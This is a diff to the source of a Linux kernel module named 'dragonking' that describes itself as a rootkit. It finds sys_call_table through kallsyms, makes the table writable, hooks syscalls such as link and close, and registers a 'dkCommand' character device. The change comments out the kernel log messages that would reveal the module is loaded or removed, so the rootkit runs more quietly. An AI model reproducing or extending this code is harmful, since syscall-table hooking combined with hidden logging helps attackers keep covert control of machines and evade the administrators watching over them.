@@ -84,7 +84,7 @@ void set_addr_ro(unsigned long addr)
 static int __init dragonking_init(void)
 {
 	int t = register_chrdev(666, "dkCommand", &fops);
-	printk("Device register return: %d\n", t);
+	//printk("Device register return: %d\n", t);
 	//Search /proc/kallsyms for sys_call_table's address
 	sys_call_table = (unsigned long**)kallsyms_lookup_name("sys_call_table");
 	//Change object's permission to RW
@@ -105,7 +105,7 @@ static int __init dragonking_init(void)
 	//sys_call_table[__NR_open] = (unsigned long *)&hacked_open;
 	//Set back to RO
 	set_addr_ro((unsigned long) sys_call_table);
-	printk(KERN_INFO "This is a rootkit.\n");
+	//printk(KERN_INFO "This is a rootkit.\n");
 	return 0;    
 }
 
@@ -120,7 +120,7 @@ static void __exit dragonking_cleanup(void)
 	    sys_call_table[__NR_link] = (unsigned long*)&orig_link;
 	    sys_call_table[__NR_close] = (unsigned long*)&orig_close;
 	    set_addr_ro((unsigned long) sys_call_table);
-	    printk(KERN_INFO "Rootkit removed.\n");
+	    //printk(KERN_INFO "Rootkit removed.\n");
 }
 
 module_init(dragonking_init);
